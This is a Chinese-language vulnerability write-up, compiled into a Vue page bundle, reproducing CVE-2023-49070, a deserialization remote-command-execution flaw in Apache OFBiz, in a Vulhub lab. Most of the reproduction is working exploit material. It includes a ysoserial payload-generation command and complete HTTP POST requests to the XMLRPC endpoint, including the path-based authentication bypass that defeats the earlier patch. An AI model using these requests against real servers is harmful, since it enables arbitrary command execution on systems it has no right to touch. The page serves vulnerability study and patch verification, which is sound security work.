import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as o,a as e,b as t,d as a,e as n}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),m=e("p",null,"Apache OFBiz 是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新 J2EE/XML 规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类 WEB 应用系统的框架。 OFBiz 最主要的特点是 OFBiz 提供了一整套的开发基于 Java 的 web 应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。",-1),u=e("p",null,"在 Apache OFBiz 17.12.03 版本及以前存在一处 XMLRPC 导致的反序列漏洞，官方于后续的版本中对相关接口进行加固修复漏洞，但修复方法存在绕过问题（CVE-2023-49070），攻击者仍然可以利用反序列化漏洞在目标服务器中执行任意命令。",-1),v=e("p",null,"Apache OFBiz 官方于 18.12.10 中彻底删除 xmlrpc 接口修复该漏洞。",-1),p=e("p",null,"参考链接：",-1),g={href:"https://www.openwall.com/lists/oss-security/2023/12/04/2",target:"_blank",rel:"noopener noreferrer"},b=n(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Apache OfBiz 18.12.09 版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果是非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain xx.xx.xx.xx not accepted to prevent host header injection. You need to set host-headers-allowed property in security.properties file.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240104105720312.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),h={href:"https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496",target:"_blank",rel:"noopener noreferrer"},x={href:"https://github.com/frohoff/ysoserial",target:"_blank",rel:"noopener noreferrer"},_=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial.jar CommonsBeanutils1 &quot;touch /tmp/awesome_poc&quot; | base64 | tr -d &quot;\\n&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231212094740031.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用 CVE-2020-9496 中的复现方法发送数据包，已经无法成功进入 XMLRPC 的解析流程：</p><blockquote><p>Host: localhost</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/xmlrpc HTTP/1.1
Host: localhost
Content-Type: application/xml
Content-Length: 4093

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;test&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231212095704854.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>把 Path 修改成 <code>/webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</code> 即可绕过限制：</p><blockquote><p>Host: localhost</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
Host: localhost
Content-Type: application/xml
Content-Length: 4093

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;test&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231212095750567.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器中，可见 <code>touch /tmp/success</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231212095901069.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function f(w,k){const i=s("ExternalLinkIcon");return r(),o("div",null,[c,m,u,v,p,e("ul",null,[e("li",null,[e("a",g,[t("https://www.openwall.com/lists/oss-security/2023/12/04/2"),a(i)])])]),b,e("p",null,[t("漏洞复现方式与 "),e("a",h,[t("CVE-2020-9496"),a(i)]),t(" 相似，只是需要绕过官方对于漏洞的补丁限制。")]),e("p",null,[t("首先，仍然使用 "),e("a",x,[t("ysoserial"),a(i)]),t(" 的 CommonsBeanutils1 来生成 Payload：")]),_])}const E=l(d,[["render",f],["__file","Apache OfBiz 反序列化命令执行漏洞 CVE-2023-49070.html.vue"]]);export{E as default};
